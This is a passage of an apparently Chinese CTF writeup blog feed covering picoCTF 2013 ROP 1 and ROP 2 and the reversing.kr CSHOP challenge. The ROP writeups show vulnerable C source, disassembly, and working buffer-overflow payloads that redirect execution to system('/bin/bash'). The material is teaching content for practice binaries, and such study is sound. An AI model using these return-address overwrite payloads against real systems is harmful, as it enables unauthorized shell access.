+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-3&quot; title=&quot;3&quot;&gt;|           &lt;span class=&quot;co&quot;&gt;; var int local_88h @ ebp-0x88&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-4&quot; title=&quot;4&quot;&gt;|           &lt;span class=&quot;co&quot;&gt;; var void *buf @ esp+0x4&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-5&quot; title=&quot;5&quot;&gt;|           &lt;span class=&quot;co&quot;&gt;; var size_t nbyte @ esp+0x8&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-6&quot; title=&quot;6&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x080484b8      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-7&quot; title=&quot;7&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x080484b9      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-8&quot; title=&quot;8&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x080484bb      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;, 0x98&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-9&quot; title=&quot;9&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x080484c1      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;dword&lt;/span&gt; [nbyte]&lt;span class=&quot;bn&quot;&gt;, 0x100 &lt;/span&gt;&lt;span class=&quot;co&quot;&gt;; [0x100:4]=-1 ; 256 ; size_t nbyte&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-10&quot; title=&quot;10&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x080484c9      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;, [local_88h]&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-11&quot; title=&quot;11&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x080484cf      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;dword&lt;/span&gt; [buf], &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;; void *buf&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-12&quot; title=&quot;12&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x080484d3      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;dword&lt;/span&gt; [&lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt;], &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;; int fildes&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-13&quot; title=&quot;13&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x080484da      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;call&lt;/span&gt; sym.imp.read &lt;span class=&quot;co&quot;&gt;; ssize_t read(int fildes, void *buf, size_t nbyte)&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-14&quot; title=&quot;14&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x080484df      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;leave&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-15&quot; title=&quot;15&quot;&gt;\&lt;span class=&quot;bn&quot;&gt;           0x080484e0      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;ret&lt;/span&gt;&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;因此首先使用 0x88 个字节把缓冲区填满，4 个字节填满 ebp，后面 4 个字节填上 &lt;code&gt;not_called&lt;/code&gt; 的地址：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode python&quot;&gt;&lt;code class=&quot;sourceCode python&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-1&quot; title=&quot;1&quot;&gt;(python &lt;span class=&quot;op&quot;&gt;-&lt;/span&gt;c &lt;span class=&quot;st&quot;&gt;&amp;quot;print &amp;#39;0&amp;#39; * 0x88 + &amp;#39;0000&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\xa4\x84\x04\x08\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;cat) &lt;span class=&quot;op&quot;&gt;|&lt;/span&gt; .&lt;span class=&quot;op&quot;&gt;/&lt;/span&gt;rop1&lt;span class=&quot;op&quot;&gt;-&lt;/span&gt;fa6168f4d8eba0eb&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-2&quot; title=&quot;2&quot;&gt;                               ↑EBP ↑&lt;span class=&quot;op&quot;&gt;----&lt;/span&gt;返回地址&lt;span class=&quot;op&quot;&gt;----&lt;/span&gt;↑ &lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;</content><author><name></name></author><category term="pwn" /><summary type="html">这是一道基本的溢出题，也提供了源码：</summary></entry><entry><title type="html">ROP 2</title><link href="https://ctf.dontpanic.blog/writeups/picoctf-2013-rop-2.html" rel="alternate" type="text/html" title="ROP 2" /><published>2019-02-12T00:00:00+00:00</published><updated>2019-02-12T00:00:00+00:00</updated><id>https://ctf.dontpanic.blog/writeups/picoctf-2013-rop-2</id><content type="html" xml:base="https://ctf.dontpanic.blog/writeups/picoctf-2013-rop-2.html">&lt;p&gt;这是 &lt;a href=&quot;/writeups/picoctf-2013-rop-1.html&quot;&gt;ROP 1&lt;/a&gt; 的进阶版。&lt;code&gt;not_called&lt;/code&gt; 不再直执行 &lt;code&gt;/bin/bash&lt;/code&gt;：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-1&quot; title=&quot;1&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#undef _FORTIFY_SOURCE&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-2&quot; title=&quot;2&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-3&quot; title=&quot;3&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-4&quot; title=&quot;4&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-5&quot; title=&quot;5&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-6&quot; title=&quot;6&quot;&gt;&lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; * not_used = &lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-7&quot; title=&quot;7&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-8&quot; title=&quot;8&quot;&gt;&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; not_called() {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-9&quot; title=&quot;9&quot;&gt;    &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt; system(&lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/date&amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-10&quot; title=&quot;10&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-11&quot; title=&quot;11&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-12&quot; title=&quot;12&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; vulnerable_function() {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-13&quot; title=&quot;13&quot;&gt;    &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; buf[&lt;span class=&quot;dv&quot;&gt;128&lt;/span&gt;];&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-14&quot; title=&quot;14&quot;&gt;    read(STDIN_FILENO, buf, &lt;span class=&quot;dv&quot;&gt;256&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-15&quot; title=&quot;15&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-16&quot; title=&quot;16&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-17&quot; title=&quot;17&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; be_nice_to_people() {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-18&quot; title=&quot;18&quot;&gt;    &lt;span class=&quot;co&quot;&gt;// /bin/sh is usually symlinked to bash, which usually drops privs. Make&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-19&quot; title=&quot;19&quot;&gt;    &lt;span class=&quot;co&quot;&gt;// sure we don&amp;#39;t drop privs if we exec bash, (ie if we call system()).&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-20&quot; title=&quot;20&quot;&gt;    gid_t gid = getegid();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-21&quot; title=&quot;21&quot;&gt;    setresgid(gid, gid, gid);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-22&quot; title=&quot;22&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-23&quot; title=&quot;23&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-24&quot; title=&quot;24&quot;&gt;&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; main(&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt;** argv) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-25&quot; title=&quot;25&quot;&gt;    be_nice_to_people();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-26&quot; title=&quot;26&quot;&gt;    vulnerable_function();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-27&quot; title=&quot;27&quot;&gt;    write(STDOUT_FILENO, &lt;span class=&quot;st&quot;&gt;&amp;quot;Hello, World&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;13&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-28&quot; title=&quot;28&quot;&gt;}&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+&lt;div id=&quot;writeup_show_button&quot; style=&quot;cursor: pointer&quot;&gt;
+    &lt;div class=&quot;alert alert-warning&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处显示 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;writeup_hide_button&quot; style=&quot;cursor: pointer&quot; class=&quot;d-none&quot;&gt;
+    &lt;div class=&quot;alert alert-info&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处隐藏 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;script&gt;
+(function()
+{
+    var parent = document.scripts[document.scripts.length - 1].parentNode;
+    parent.querySelector(&quot;#writeup_show_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.remove(&quot;d-none&quot;);
+    }
+    parent.querySelector(&quot;#writeup_hide_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.add(&quot;d-none&quot;);
+    }
+})();
+&lt;/script&gt;
+&lt;div id=&quot;writeup&quot; class=&quot;d-none&quot; markdown=&quot;1&quot;&gt;
+&lt;p&gt;由于 &lt;code&gt;not_called&lt;/code&gt; 不再直接调用 &lt;code&gt;system(&quot;/bin/bash&quot;)&lt;/code&gt;，我们需要修改传入 &lt;code&gt;system&lt;/code&gt; 的参数。&lt;code&gt;system&lt;/code&gt; 只接受一个参数，对于 32 位程序来说，当我们调用 &lt;code&gt;system&lt;/code&gt; 时，栈顶的数据就会被传入 &lt;code&gt;system&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;考虑到 &lt;code&gt;vulnerable_function&lt;/code&gt; 没有参数，那么在函数返回后，esp 就会变为当前 ebp + 4，也就是返回地址再下面 4 个字节。所以只要我们把 &lt;code&gt;not_used&lt;/code&gt; 的地址写到返回地址的下方，再直接调用 &lt;code&gt;call system&lt;/code&gt; 就可以了。&lt;/p&gt;
+&lt;p&gt;首先看一下 &lt;code&gt;not_used&lt;/code&gt; 中 &lt;code&gt;call system&lt;/code&gt; 一句的地址：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode .asm&quot;&gt;&lt;code class=&quot;sourceCode fasm&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-1&quot; title=&quot;1&quot;&gt;/ (fcn) sym.not_called &lt;span class=&quot;dv&quot;&gt;20&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-2&quot; title=&quot;2&quot;&gt;|   sym.not_called ()&lt;span class=&quot;co&quot;&gt;;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-3&quot; title=&quot;3&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x080484a4      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-4&quot; title=&quot;4&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x080484a5      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-5&quot; title=&quot;5&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x080484a7      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;, 0x18&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-6&quot; title=&quot;6&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x080484aa      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;dword&lt;/span&gt; [&lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt;], &lt;span class=&quot;bu&quot;&gt;str&lt;/span&gt;.bin_date &lt;span class=&quot;co&quot;&gt;; [0x804861a:4]=0x6e69622f ; &amp;quot;/bin/date&amp;quot; ; const char *string&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-7&quot; title=&quot;7&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x080484b1      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;call&lt;/span&gt; sym.imp.system &lt;span class=&quot;co&quot;&gt;; int system(const char *string)&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-8&quot; title=&quot;8&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x080484b6      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;leave&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-9&quot; title=&quot;9&quot;&gt;\&lt;span class=&quot;bn&quot;&gt;           0x080484b7      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;ret&lt;/span&gt;&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;我们就直接返回到 &lt;code&gt;0x080484b1&lt;/code&gt; 即可；再看一下 &lt;code&gt;not_used&lt;/code&gt; 字符串的地址：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[0x080483f0]&amp;gt; iz
+000 0x00000610 0x08048610   9  10 (.rodata) ascii /bin/bash
+001 0x0000061a 0x0804861a   9  10 (.rodata) ascii /bin/date
+002 0x00000624 0x08048624  13  14 (.rodata) ascii Hello, World\n&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;地址是 &lt;code&gt;0x08048610&lt;/code&gt;。因此构造一下输入：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode python&quot;&gt;&lt;code class=&quot;sourceCode python&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb4-1&quot; title=&quot;1&quot;&gt;(python &lt;span class=&quot;op&quot;&gt;-&lt;/span&gt;c &lt;span class=&quot;st&quot;&gt;&amp;quot;print &amp;#39;0&amp;#39; * 0x88 + &amp;#39;0000&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\xb1\x84\x04\x08\x10\x86\x04\x08\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;cat) &lt;span class=&quot;op&quot;&gt;|&lt;/span&gt; .&lt;span class=&quot;op&quot;&gt;/&lt;/span&gt;rop2&lt;span class=&quot;op&quot;&gt;-&lt;/span&gt;20f65dd0bcbe267d&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb4-2&quot; title=&quot;2&quot;&gt;                               ↑EBP ↑&lt;span class=&quot;op&quot;&gt;----&lt;/span&gt;返回地址&lt;span class=&quot;op&quot;&gt;----&lt;/span&gt;↑&lt;span class=&quot;op&quot;&gt;----&lt;/span&gt;栈顶内容&lt;span class=&quot;op&quot;&gt;----&lt;/span&gt;↑   ↑缓冲区剩余部分&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;就可以了。&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;</content><author><name></name></author><category term="pwn" /><summary type="html">这是 ROP 1 的进阶版。not_called 不再直执行 /bin/bash：</summary></entry><entry><title type="html">CSHOP</title><link href="https://ctf.dontpanic.blog/writeups/reversing-kr-cshop.html" rel="alternate" type="text/html" title="CSHOP" /><published>2019-02-11T00:00:00+00:00</published><updated>2019-02-11T00:00:00+00:00</updated><id>https://ctf.dontpanic.blog/writeups/reversing-kr-cshop</id><content type="html" xml:base="https://ctf.dontpanic.blog/writeups/reversing-kr-cshop.html">&lt;p&gt;下载文件后打开，发现只是一个空白窗体：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/local/posts/reversing-kr-cshop/screenshot.png&quot; alt=&quot;screenshot&quot; /&gt;&lt;/p&gt;
+&lt;div&gt;
+&lt;div id=&quot;writeup_show_button&quot; style=&quot;cursor: pointer&quot;&gt;
+    &lt;div class=&quot;alert alert-warning&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处显示 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;writeup_hide_button&quot; style=&quot;cursor: pointer&quot; class=&quot;d-none&quot;&gt;
+    &lt;div class=&quot;alert alert-info&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处隐藏 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;script&gt;
+(function()
+{
+    var parent = document.scripts[document.scripts.length - 1].parentNode;
+    parent.querySelector(&quot;#writeup_show_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.remove(&quot;d-none&quot;);
+    }
+    parent.querySelector(&quot;#writeup_hide_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.add(&quot;d-none&quot;);
+    }
+})();
+&lt;/script&gt;
+&lt;div id=&quot;writeup&quot; class=&quot;d-none&quot; markdown=&quot;1&quot;&gt;
+&lt;p&gt;用 Cutter 加载后，发现只有一句：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode asm&quot;&gt;&lt;code class=&quot;sourceCode fasm&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-1&quot; title=&quot;1&quot;&gt;&lt;span class=&quot;bn&quot;&gt;0x0042b48e      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;jmp&lt;/span&gt;  &lt;span class=&quot;dt&quot;&gt;dword&lt;/span&gt; [sym.imp.mscoree.dll__CorExeMain]&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;这说明这是一个 .Net 程序。使用 dotPeek 打开，看一下窗体类，类的成员有点奇怪：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/local/posts/reversing-kr-cshop/members.png&quot; alt=&quot;members&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;换用 dnSpy 打开，原来是因为变量名中存在不可见字符。在反编译出的函数中，&lt;code&gt;Click&lt;/code&gt; 最为可疑，似乎是设置了 flag：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/local/posts/reversing-kr-cshop/dnspy.png&quot; alt=&quot;dnspy&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;向下找到 &lt;code&gt;InitializeComponent&lt;/code&gt;，看一下这个 Click 是在哪用到的：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/local/posts/reversing-kr-cshop/initializecomponent.png&quot; alt=&quot;initialize_component&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;原来是按钮的 Click 事件。这个按钮的 Size 被设置为了 0，不过还设置了 TabIndex 为 0。因此我们打开程序后，按一下 Tab，再按一下回车，就可以显示出 Flag 了。&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;</content><author><name></name></author><category term="reversing" /><summary type="html">下载文件后打开，发现只是一个空白窗体：</summary></entry></feed>
